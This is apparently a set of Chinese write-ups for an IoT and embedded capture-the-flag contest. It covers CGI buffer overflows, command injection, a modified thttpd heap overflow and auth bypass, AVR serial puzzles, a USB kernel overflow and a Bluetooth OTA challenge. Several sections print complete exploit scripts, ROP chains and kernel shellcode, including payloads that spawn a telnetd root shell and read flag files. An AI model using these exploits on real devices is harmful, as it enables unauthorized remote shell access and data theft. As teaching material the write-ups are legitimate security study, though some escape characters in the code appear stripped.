.text:00010AFC sub_10AFC ; CODE XREF: sub_10B48+17C↓p.text:00010AFC.text:00010AFC var_304 = -0x304.text:00010AFC src = -0x300.text:00010AFC dest = -0x2F8.text:00010AFC n = -8.text:00010AFC.text:00010AFC PUSH {R11,LR}.text:00010B00 ADD R11, SP, #4.text:00010B04 SUB SP, SP, #0x300.text:00010B08 STR R0, [R11,#src].text:00010B0C STR R1, [R11,#var_304].text:00010B10 LDR R3, [R11,#var_304].text:00010B14 STR R3, [R11,#n].text:00010B18 LDR R3, [R11,#src].text:00010B1C CMP R3, #0.text:00010B20 BEQ loc_10B3C.text:00010B24 LDR R2, [R11,#n] ; n.text:00010B28 SUB R3, R11, #-dest.text:00010B2C LDR R1, [R11,#src] ; src.text:00010B30 MOV R0, R3 ; dest.text:00010B34 BL strncpy.text:00010B38 NOP.text:00010B3C.text:00010B3C loc_10B3C ; CODE XREF: sub_10AFC+24↑j.text:00010B3C NOP.text:00010B40 SUB SP, R11, #4.text:00010B44 POP {R11,PC}

2. 关于调试

如果拿到板子的权限，可以用板子的arm环境来进行调试，如下payload.txt 为exp里面payload的内容，也就是post_data。

export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'cat payload.txt | gdbserver 0.0.0.0:1234 ./var/www/cgi-bin/55.cgi

也可以用qemu的方式来进行模拟调试

export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'
cat payload.txt | ./qemu-arm-static -g 1234 -L /usr/arm-linux-gnueabi/ ./55.cgi

然后本机

gdb-multiarch ./55.cgi -x xgdb.sh

其中 xgdb.sh 如下

set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:1234

3. 解题脚本

import requests from pwn import * import binascii
IP = "20.21.2.27"
url = "http://{}/cgi-bin/63.cgi".format(IP)uuid = ""for i in range(2, 6): r = requests.get( url=url, headers={"COOKIES": "uuid=%{}$x".format(str(i))} ) res = r.text.split('n')[0] uuid += binascii.unhexlify(res).decode()[::-1] print(uuid) 
url = "http://{}/cgi-bin/55.cgi".format(IP)payload = b"*#$^" + b"xff" * 3 + b"xff" * 3 payload = payload.ljust(0x2b0, b"B") payload += b'telnetd -p6789 -l/bin/sh;' payload = payload.ljust(0x5A8, b"C") payload += p32(0x000109DC) r = requests.post( url=url, headers={ "COOKIES": "uuid={}".format(uuid), "Content-Type": "application/x-www-form-urlencoded" }, data=payload)
sleep(2)os.system("telnet {} 6789".format(IP))

本题改编自真实世界的漏洞，考察选手固件漏洞挖掘能力和漏洞利用能力。

flc_cgi.cgi在main函数解析action=command&command=network&x=y时，x字段发生了栈溢出。

1. 解题思路

漏洞点并不难找，有难度的是漏洞利用，同样是有截断的栈溢出，并且Flc_Cgi_Strupr函数还会将payload里的小写字母转化成大写字母，由于payload会通过httpd解析之后传给cgi, 所以payload里面也不能有rn，不然会影响httpd解析，而且payload也不能有 =，不然会影响action的解析。

总数所述，我们的payload不能有x00, 小写字母,rn和等号。

程序NX保护开着，只能寻找合适的ROP链做；并且是heap上的数据拷贝到stack上时发生的溢出，不能用add_sp 调整栈帧来做。

可提供的一种利用思路是：

由于是cgi程序，可以通过碰撞libc基址的方式先解决 x00问题

利用pop {lr} ; add sp, sp, #4 ; bx lr 和 pop {r0, r1, r2, r3, pc}，循环调用函数

利用strcpy函数来拼接命令，最终调用system执行，在寻找字符串地址和gadget地址时要注意过滤的字符

3. 关于调试

这里可以使用FirmAE 将文件系统整个模拟起来，并且里面自带gdbserver，可以远程连接调试

gdbserver 在 /firmadyne/目录里

gdb可以从 httpd 程序调试到cgi程序，只要设置好断点，保证程序流程执行正确。

4. 解题脚本

#!/usr/bin/env python#-*- coding:utf-8 -*-# @Author : nocbtm

import osimport sysfrom pwn import *
context(arch='arm', os='linux', endian='little', word_size=32)# context.log_level = 'debug'
if len(sys.argv) < 3: print("[+] Example python exp.py ip port") exit(-1)
IP = sys.argv[1]PORT = sys.argv[2]HOST = IP + ":" + str(PORT)command = "telnetd -p6789 -l/bin/sh"
"""func returnPOP {R4-R11,PC}"""
# a 0x61# z 0x7a

binary_path = './www/cgi-bin/flc_cgi.cgi'libc_path = './lib/libc-2.13.so'
libc = ELF(libc_path)
libc_addr = 0xb6e8d000
def getStrAddr(s): off = libc.search(s) str_addr = 0 for i in off:# print(hex(i)) str_addr = libc_addr + i if (str_addr & 0xffff) >> 8 != 0xd and (str_addr & 0xffff) >> 8 != 0xa and ((str_addr & 0xffff) >> 8 > 0x7a or (str_addr & 0xffff) >> 8 < 0x61)and ((str_addr & 0xff) > 0x7a or (str_addr & 0xff) < 0x61 )and (str_addr & 0xff) != 0xd and (str_addr & 0xff) != 0xa and (str_addr & 0xff) != 0x3d: break
# print('{} addr is {:#x}'.format(s,str_addr)) return str_addr
system_addr = libc_addr + libc.sym['system']
print("system addr is " + hex(system_addr))
gadget = libc_addr + 0xfcee0 # pop {r0, pc}gadget2 = libc_addr + 0x000fd524 # pop {r0, r1, r2, r3, pc}lr_gadget = libc_addr + 0x00038a40 # pop {lr} ; add sp, sp, #4 ; bx lr
memcpy_addr = libc_addr + 0x75810strcpy_addr = libc_addr + 0x734A0command_addr = libc_addr + 0x12afd8print("command " + hex(command_addr))
tel_addr = getStrAddr('telx00')net_addr = getStrAddr('netx00')d_addr = getStrAddr('dx00')kong_addr = getStrAddr(' x00')gang_addr = getStrAddr('-x00')p_addr = getStrAddr('px00')port_addr = getStrAddr('6789x00')l_addr = getStrAddr('lx00')binsh_addr = getStrAddr('/bin/shx00')fenhao_addr = getStrAddr(';x00')
buf2 = 'A'*(0x14)buf2 += p32(command_addr) #R4buf2 += p32(command_addr) #R5buf2 += p32(command_addr)*6 #R6 - R11
# telnetd -p6789 -l/bin/sh;buf2 += p32(lr_gadget) + p32(gadget2) + p32(0x01010101)
buf2 += p32(command_addr) + p32(tel_addr) + "A"*8 + p32(strcpy_addr)buf2 += p32(command_addr+3) + p32(net_addr) + "B"*8 + p32(strcpy_addr)buf2 += p32(command_addr+6) + p32(d_addr) + "C"*8 + p32(strcpy_addr)
buf2 += p32(command_addr+7) + p32(kong_addr) + p32(0x01010101)*2 + p32(strcpy_addr)buf2 += p32(command_addr+8) + p32(gang_addr) + "D"*8 + p32(strcpy_addr)buf2 += p32(command_addr+9) + p32(p_addr) + "E"*8 + p32(strcpy_addr)buf2 += p32(command_addr+10) + p32(port_addr) + "F"*8 + p32(strcpy_addr)buf2 += p32(command_addr+14) + p32(kong_addr) + p32(0x01010101)*2 + p32(strcpy_addr)buf2 += p32(command_addr+15) + p32(gang_addr) + "G"*8 + p32(strcpy_addr)buf2 += p32(command_addr+16) + p32(l_addr) + "H"*8 + p32(strcpy_addr)buf2 += p32(command_addr+17) + p32(binsh_addr) +"I"*8 + p32(strcpy_addr)buf2 += p32(command_addr+24) + p32(fenhao_addr) +"J"*8 + p32(strcpy_addr)
buf2 += p32(command_addr) + p32(0xbefffb74) + p32(0xbefffb74) + p32(command_addr)+ p32(0x90B4)action = 'action=command&command=network&{}=1'.format(buf2)

payload = ''payload += 'GET /cgi-bin/flc_cgi.cgi?{} HTTP/1.1rn'.format(action)payload += 'Host: {}rn'.format(HOST)payload += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0rn'payload += 'Content-Type: application/octet-streamrn'payload += 'X-Requested-With: XMLHttpRequestrn'payload += 'Referer: http://192.168.0.1/fm.htmlrn'payload += 'rn'
while True: try: sleep(0.1) p = remote(IP, PORT) p.send(payload) content = p.recv() print(content) if 'HTTP' in content: try: p = remote(IP, 6789) if p: print("Attack Success") break except: p.close() pass
 except: p.close() pass
print("Now you can telnet {} 6789".format(IP))os.system("telnet {} 6789".format(IP))

本题考察了一道命令注入绕过和缓冲区未初始化漏洞的场景题，题目为一道CLI题，连接到对应的端口后会有提示。

在logs_download功能处有tftp命令的功能，可以输入指定的ip地址，使用tftp将log文件回传到本地：

在get_input命令处会对一系列的敏感字符进行过滤：

if(c[idx] == '-' || c[idx] == ';' || c[idx] == '|' || c[idx] == '`' || c[idx] == '&' || c[idx] == '$' || c[idx] == '!' || c[idx] == '(' || c[idx] == ')' || c[idx] == ''' || c[idx] == '"'){ SIM_SYSLOG_OP("Illegal input!");return -1;        }

但是这里的ip缓冲区并未进行清空内存，在第二次输入时会有残留的数据，同时get_input函数也不会对敏感的字符进行清除，导致可以两次调用logs_download并构造payload：

第一次：Acat /flag第二次：;

由于第二次会把；覆盖掉A字符，最终拼接的命令为：

tftp -p -l /tmp/logs.txt -r /tmp/logs.txt ;cat /flag

最终达到读取flag的效果：

彩蛋：实际上在busybox二进制的的ifconfig模块中存在另外一处后门漏洞，通过netinfo功能，触发后门漏洞可以直接拿到板子的shell，用于调试使用

本题魔改自 http://acme.com/software/thttpd/, 考察选手快速逆向、漏洞挖掘及利用的相关能力.

1. 题目分析

根据题目所给的附件或者查看http协议的数据响应包头部，可知 webserver使用的是 thttpd 中间件/服务器。

Server: thttpd/2.29 23May2018

得知其是thttpd以后,可去下载相关源码,进行辅助逆向分析。

1.1 程序编译

准备编译换环境:
apt-get install gcc-arm*

安装完毕以后,可以使用arm-linux-gnueabi-gcc来进行编译

在源码目录下:

CC=/usr/bin/arm-linux-gnueabi-gcc ./configure

来生成./Makefile,生成以后修改一下,

在CFLAGS加上-g的标志位,接着make进行编译,来生成带debug信息的程序

# file thttpdthttpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=30fc332f1e5780c1c7e72cbd9070ab0c767bf3cf, with debug_info, not stripped

1.2 恢复符号表

（1）使用ida分析刚刚编译生成的thttpd文件,使其生成idb文件,接着再使用bindiff来恢复相似率在百分之80以上的符号信息

（2）恢复结构体信息

在file->Produce file -> Create C header file 下:

接着在题目附件的程序中

选择刚刚导出来的thhpd.h

接着就可以对比源码,来进行逆向分析了.

1.3 漏洞点

经对程序逆向及题目附件,可以发现其实并没有太多可以用的功能,就一个登陆界面以及登陆成功后的index.html,其文件系统中www下:

❯ ls -altotal 16drwxr-xr-x 1 iot iot 128 Mar 9 14:33 .drwxr-xr-x 1 iot iot 256 Mar 15 11:29 ..-rw-r--r-- 1 iot iot 19 Mar 9 14:33 .htpasswd-rw-r--r-- 1 iot iot 221 Mar 9 14:33 index.html❯ cat .htpasswd admin:tp2A/UzJN/Vr

其负责用户验证的.htpasswd文件,也是经过加密的字符串.

因无题目编译时的gcc,所以根据源码生成的bin文件与题目本身进行bindiff,寻找关键的差异点还是较为困难的. 可以考虑从危险函数回溯来进行分析程序,因为基本无太多为用户提供服务的功能函数,所以可以先着重分析其http协议交互字段相关的函数.在IoT相关的历史漏洞中,处理http协议交互字段出现问题的例子,还是挺多的.

第一个漏洞点存在于解析http请求的httpd_parse_request函数:

可以看到其在处理Accept-Encoding:字段时,在最后是往结构体hc中的accept上写的数据,并不是accepte,如果在Accept:字段把数据发送的小一些,在Accept-Encoding:数据发送的大一些,这会导致堆溢出,可以覆盖到后面的变量数据.

第二个漏洞点存在与用户认证的auth_check2函数:

其看到:

/* Returns -1 == unauthorized, 0 == no auth file, 1 = authorized. */

其在b64_decode解码账号密码相关字段后,会进行对authinfo的判断,如果第一个字符为空,就会直接返回,且该段逻辑是新加的.可以向上追踪result返回值,发现其初始值为0,会使得程序误以为是无.htpasswd的用户验证文件,导致可以直接未授权访问文件.

接着重点落在了如何使得authinfo为空,authinfo是由:

Authorization: Basic $(var)

当中的 $(var) base64解码后得来的,其前面也做了一定的校验:

$(var) 不可为空

( hc->authorization) 长度需要大于10,其中Basic已经占用了6个字符,也就是$(var)的长度需要大于4

$(var) 的第一个字符不可为 =

这是可以绕过的,如:

Authorization: Basic -====

2. 漏洞利用

2.1 思路

主要是一些堆风水,其思想是使用堆溢出,覆盖到hc->origfilename,使其写为../../flag.txt,以此来获得flag

第一个数据包,请求的 url长度需大于0xC8字节，使得url新分配的堆的排在末尾位置,为了使得accept溢出的数据可以覆盖到

第二个数据包,请求一个实际存在的index.html文件,使其为authpath分配堆块(调试会发现,如果直接发第3个数据包,使得堆块数据破坏后,到这里会让程序崩溃)

第三个数据包,通过Accept-Encoding字段,从accept来填充数据,开始去覆盖掉放在堆块末尾的 url相关数据

需要注意的是:1、在前2个数据包中,不进行用户认证绕过也是可以进行堆排布的.2、httpd_parse_request函数中存在的de_dotdot函数路径穿越检查,是在漏洞点相关流程之前的，

所以覆盖完hc->origfilename后,并无检查了,即可实现任意文件读取.

3. 脚本

#!/usr/bin/env python# encoding: utf-8from pwn import *import timecontext.log_level = 'debug'
# for hc->origfilename in a specific location url = '/'+'a'*0xC8Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
# for &authpath chunk
url = '/index.html'Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()

sleep(3)# for change hc->origfilenamep = remote("20.21.2.27",80)url = '/'Accept = 'b'AcceptE = 'c'*0x1468+'../../flag.txt'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Authorization: Basic -====rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p.send(payload)p.recv()p.close()

在选手物料中有一块绿色PINOUT板，将其FPC软排线接在标记为”MCU”的连接器上，即可通过该绿色板子与UART和USBASP编程器连接。

此题为简单题，考察选手阅读原理图、理解F_CPU、串口焊接等能力，根据提示，AVR时钟F_CPU存在下面逻辑：

for(;;){if(!PD2){ F_CPU-=10000; }else{ F_CPU=F_CPU; }}

可知将PD2短接地，将降低F_CPU。根据串口提示获取更多flag输出。所以，只要将PD2引脚多次短接GND即可输出全部falg，如下图：

此题为简单题，考察阅读原理图、串口焊接、侧信道时耗分析思维等能力。根据串口输出，以及附件提示

单片机实现摩斯加密过程，已知在处理高汉明重量时消耗的时间较长，串口输出为计数器Count日志，请输出明文。t = 1000000 * Count / 16000000）

data < -(k0, k1, k2...k6); r < -("_", ".")for i < - 0 to 6 MOSI_enc(r, data[i]) delay 350msend

根据已知条件汉明重量较高时，时间较长，查阅资料得知“hangming(“.”) = 4，hangming(“_”) = 6”，可知在处理“_”时，耗时较长，将计数器转成图片如下。

根据图片可得莫斯密码如下

.－－/./.－－－－/－.－./－－－－－/－－/.

即flag为w1c0me(忽略大小写)

比赛时通过连接板子串口查看输出信息：

可以看到就是一个base64的操作，根据后面的hint可以知道考点就是逆向base64字母表。

1. 使用工具

提取固件：avrdude、gcc-avr、avr-libc

动态模拟：simavr

动态调试：avr-gdb

静态逆向：radare2

以上工具在Ubuntu环境下可以直接使用 apt-get install安装。

2. 提取固件

这道题目一开始给的定位是签到题，所以就没有锁死熔丝位，连大佬说的lockbits也没有加，可以直接使用avrdude -F -c usbasp -p atmega328p -U flash:r:base64.hex提取固件。

3. 静态分析

提到了固件，使用 avr-objcopy工具将其转换成 bin文件格式。

使用 strings命令，查看有没有什么信息

只可以看到几个硬编码字符串，其中包括flag。再使用 radare2对bin文件进行分析。

使用 aaaaa命令进行初步分析

使用 afl命令列出所有函数（截图中仅给出部分），其中注意的是位于0x00000068处的entry0函数，它是整个程序的核心入口。

使用radare2的 pd @ <function name>功能，对entry0函数进行反汇编，查查看其代码。

在进行一些环境、栈相关的初始化之后，entry0呈现了几个线索性的函数调用，再使用 pd命令查看一下这些函数。

如果再这样继续分析下去，虽然确实没有几个函数，但纯汇编分析也够喝一壶了，算得上是中等难度的题了。来看看签到的做法！

4. 动态模拟

使用qemu-system-avr模拟固件

按ctrl+a c进入qemu monitor模式，使用info mtree查看qemu模拟器中avr内存映射

可以看到sram的地址为0x800100-0x8008ff，接着使用memsave 0x800100 2048 1.bin指令 dump出avr内存

将1.bin拖进bless即可找到自定义bass64字母表

编写Python脚本

def base64Decode(string): result = []string = string.strip("=") binstr = "" bin6list = [] bin8list = [] base64_list = "a0b1c2d3e4f5g6h7i8j9ZYXWVUTSRQPON+klmnopqrABCDEFGHIJKLM/stuvwxyz"
for ch in string: bin6list.append("{:>06}".format(str(bin(base64_list.index(ch)).replace("0b", ""))))
 binstr = "".join(bin6list)
for i in range(0, len(binstr), 8): bin8list.append(binstr[i:i + 8])
for item in range(len(bin8list) - 1): result.append(chr(int(bin8list[item], 2)))return "".join(result)print(base64Decode("UoH+U/D/U92lgdLnWMZIR/nOVo2JU9VKOi=="))

得到flag为 flag{we1c0me_e2sy_base64}。

1. getflag机器人

题目的说明为先攻破A设备，拿到A设备的权限之后继续攻破B设备，在A设备上做代理，访问到B设备内网的扫地机器人，扫地机器人存在漏洞，通过漏洞拿到设备权限之后，控制其移动到指定位置拍摄flag照片：

2. A设备漏洞挖掘

由于该漏洞涉及真实设备，暂不合适公开漏洞exp/poc，因此此步骤无解题思路。

3. B设备漏洞挖掘

根据固件的对比，发现为1.0.3.55版本的Cisco RV130W设备固件，该设备的漏洞点和2020年强网杯的RV110W为不同设备同一漏洞（CVE-2020-3331），直接使用poc进行调试攻击即可。

4. 扫地机器人漏洞挖掘

由于设备的漏洞未公开，此处不放解题思路和exp，感兴趣的读者可以自行进行漏洞挖掘。

在RCE了扫地机器人之后，继续逆向特定的数据包格式，在shell中控制与串口的通信交互，使其移动：

ttySAK1为机器人控制移动主板串口设备

继续逆向固件，找到摄像头的初始化脚本，发现设备用的是anyka SDK提供的内核模块来驱动摄像头组：

在网上找到对应的SDK，下载编译，对ak_venc_demo二进制进行hook之后，可以生成一张摄像头照片，demo如下：

本题模拟场景是开发人员在开发usb驱动模块的时候混淆了扇区数量、扇区大小、总容量的概念，导致缓冲区出现溢出问题。

在本题目的挑战中，被攻击目标为ARM64架构，启用了内核态NX保护，但未启用KALSR的嵌入式Linux设备。次设备不接入网络，不产生无线信号，攻击入口仅可以使用目标设备上的USB接口。额外的，我们为选手提供了一套用于调试，预先打开了串口和调试功能的测试机，选手可以通过测试机调试自己的攻击方式，并在被攻击目标上完成挑战。

漏洞函数在linux/drivers/scsi/sd.c的sd_revalidate_disk函数里面。本题创建了一个扇区大小的缓冲区，但在读磁盘数据的时候读的是扇区数量的数据，从而造成了缓冲区溢出。sdp->sector_size时扇区大小，一般都是512。sdkp->capacity是扇区数量。

void sd_read_disk_check(struct scsi_disk *sdkp){struct scsi_sense_hdr sshdr;struct scsi_device *sdp = sdkp->device;unsigned char data_buffer[sdp->sector_size];unsigned char rdCmd[10] = {READ_10, 0, 0, 0, 0, 0, 0, 0, 0, 0};int i = 0;
char cap_str_10[10]; string_get_size(sdkp->capacity, sdp->sector_size, STRING_UNITS_10, cap_str_10, sizeof(cap_str_10)); sd_printk(KERN_NOTICE, sdkp,"size:%x,%x,%sn", sdkp->capacity, sdp->sector_size, cap_str_10);
if(sdkp->capacity*sdp->sector_size>10485760)return;
 rdCmd[2] = (unsigned char)((0 >> 24) & 0xff); rdCmd[3] = (unsigned char)((0 >> 16) & 0xff); rdCmd[4] = (unsigned char)((0 >> 8) & 0xff); rdCmd[5] = (unsigned char)(0 & 0xff); rdCmd[7] = (unsigned char)(((sdkp->capacity) >> 8) & 0xff); rdCmd[8] = (unsigned char)((sdkp->capacity) & 0xff);
int the_result = scsi_execute_req(sdp, rdCmd, DMA_FROM_DEVICE, data_buffer,1024, &sshdr, SD_TIMEOUT, SD_MAX_RETRIES, NULL);if (the_result > 0) { sd_printk(KERN_NOTICE, sdkp,"readerrorn"); }else { sd_printk(KERN_NOTICE, sdkp,"readsuccessn"); }return 0;}

sd_revalidate_disk函数是scsi磁盘驱动的函数，所以漏洞需要通过磁盘插入的方式触发。提供给选手的开发板的usb默认是cdc设备的，选手如果想将开发板变成mass storage设备有两种方式，一种是直接修改设备源码驱动，第二种是通过USB Gadget框架。第二种方法可以直接在设备终端执行，不需要重新编译固件。在开发板终端执行以下代码可以将开发板变成mass storage设备。

rmmod g_ethermount none /sys/kernel/config -t configfsmkdir /sys/kernel/config/usb_gadget/g1cd /sys/kernel/config/usb_gadget/g1mkdir configs/c.1mkdir functions/mass_storage.usb0echo "/tmp/payload" > functions/mass_storage.usb0/lun.0/filemkdir strings/0x409mkdir configs/c.1/strings/0x409echo 0x1D6B > idVendorecho 0x0100 > idProductcd configs/c.1ln -s ../../functions/mass_storage.usb0/ .cd ../../echo "musb-hdrc.1.auto" > UDC

目标flag文件在根目录，获取flag的最好办法就是读取flag文件，然后将其写入磁盘。在内核可以用filp_open、vfs_read和vfs_write读取和写入文件，最后用fsync保存。

shellcode如下：

typedef long unsigned int size_t;typedef long long __kernel_loff_t;typedef __kernel_loff_t loff_t;
typedef void *(*FILP_OPEN)(const char *file);#define FILP_OPEN ((FILP_OPEN)0xffffff8008087a68)
typedef size_t (*VFS_READ)(void *file, char *buf, size_t count);#define VFS_READ ((VFS_READ)0xffffff8008087ab4)
typedef size_t (*VFS_WRITE)(void *file, char *buf, size_t count);#define VFS_WRITE ((VFS_WRITE)0xffffff8008087ad4)
typedef void (*SET_FS_KERNEL_TIPS)(void);#define SET_FS_KERNEL_TIPS ((SET_FS_KERNEL_TIPS)0xffffff8008087a84)
typedef void (*FSYNC_TIPS)(void *file);#define FSYNC_TIPS ((FSYNC_TIPS)0xffffff8008087af4)
typedef int (*PRINTK)(const char *fmt, ...);#define PRINTK ((PRINTK)0xffffff800811b374)
void _start(void){unsigned char buf_read[16];
void *fp1;void *fp2;loff_t pos1, pos2; PRINTK("start successnn"); SET_FS_KERNEL_TIPS();
 fp1 = FILP_OPEN("/dev/sda"); fp2 = FILP_OPEN("/flag");
 VFS_READ(fp2, buf_read, 16);int ret = VFS_WRITE(fp1, buf_read, 16); FSYNC_TIPS(fp1);}

因为内核开了nx保护，所以不能直接在栈上执行shellcode。在用户态一般执行的方法是调用mprotect，但在内核态不行。因为mprotect是通过获取当前进程的内存描述符mm查找vma（虚拟内存区域），然后修改vma的flag属性达到关闭nx的目的。但在内核态没有内存描述符，所以调用mprotect会报错。还有一种方法是通过修改页表属性关闭nx，Linux 64位内核采用4级页表实现虚拟地址到物理地址的转换，可以通过虚拟地址找到pgd->pud->pmd->pte，最后修改pte的属性。这里选择的方法是用memcpy将shellcode拷贝到一段可执行区域。比赛提供的调试板可以通过cat /sys/kernel/debug/kernel_page_tables看到整个内核的内存空间。

exp如下：

#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <arpa/inet.h>#include <string.h>
#define ROP1 0xffffff80083e2e90#define ROP2 0xffffff800825fbe8#define ROP3 0xffffff80083e86fc#define memcpy_addr 0xffffff8008290e00#define buf_addr 0xffffff8000836000#define memcpy_num 0x500
int main(){ FILE *fp1; FILE *fp2;
 fp1 = fopen("payload", "w+");if (!fp1)return -1;
size_t rop[0x1000] = {0};int count = 0;memset(rop, 'a', 0x208); count += 0x208 / 8; rop[count++] = ROP1; rop[count++] = ROP2; rop[count++] = buf_addr; rop[count++] = ROP3;memset(rop + count, 'a', 0x48); count += 0x48 / 8; rop[count++] = memcpy_num; rop[count++] = memcpy_addr;memset(rop + count, 'a', 0x60); count += 0x60 / 8;
 fp2 = fopen("shellcode.bin", "r");if (!fp2)return -1;
 fseek(fp2, 0, SEEK_END);int len = ftell(fp2); fseek(fp2, 0, SEEK_SET);size_t *buffer = malloc(len); len = fread(buffer, sizeof(char), len, fp2);memcpy(rop + count, buffer, len); count += len / 8 + 1;if (count < 1024 / 8 + 1) {memset(rop + count, 'a', 1024 / 8 + 1 - count); count += 1024 / 8 + 1 - count; }
 fwrite(rop, sizeof(size_t), count, fp1);free(buffer); fclose(fp1); fclose(fp2);return 0;}

1.  使用 bluescan 扫描可以发现如下信息：

$ sudo bluescan -m leAddr: 40:0F:CA:5A:C3:09 Addr type: random
Connectable: TrueRSSI: -27 dBmGeneral Access Profile:Flags: LE General Discoverable ModeBR/EDR Not SupportedComplete Local Name: FlagInFlash
$ sudo bluescan -m gatt 40:0F:CA:5A:C3:09----------------GATT Scan Result----------------Number of services: 4

Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash'Permissions: Higher layer specific
Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'FFFFFF00CYW920819EVB-02'Permissions: Higher layer specific
Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)Permissions: Read (no authen/author)

根据扫描结果可知：

目标设备暴露 OTA 服务。

目标设备型号为 CYW920819EVB-02

未知数据 FFFFFF00

2.  google CYW920819EVB-02 的官方 OTA 例子项目，可以发现 mtb-example-btsdk-ota-firmware-upgrade（https://github.com/Infineon/mtb-example-btsdk-ota-firmware-upgrade）。
阅读相关文档，并 build 它。可以得到 OTA_FirmwareUpgrade_CYW920819EVB-02.ota.bin该固件可以通过官方 OTA 升级测试程序，写入目标设备。

3.  此时需要思考，目标设备哪一个存储区的数据不会被 OTA 升级抹掉。通过阅读 CYW920819EVB-02 的 User Manual 可知该板子有一个外部 SPI flash，它会在 OTA 升级后保留数据。

4.  结合第一步获取的未知数据 FFFFFF00，即可猜测该数据是 flag 在 SPI flash 中的读写起始地址。于是调用读 SPI flash 的 API，从该地址往后读一段合适长度的数据，并把读到的数据以安全的方式暴露出来即可。比如通过 bluescan 可以扫描到最终暴露的数据：

$ sudo bluescan -m gatt----------------GATT Scan Result----------------Number of services: 4

Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash-Writeup'Permissions: Higher layer specific
Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'flag{sEcvRe_yOur_oTA!}'Permissions: Higher layer specific
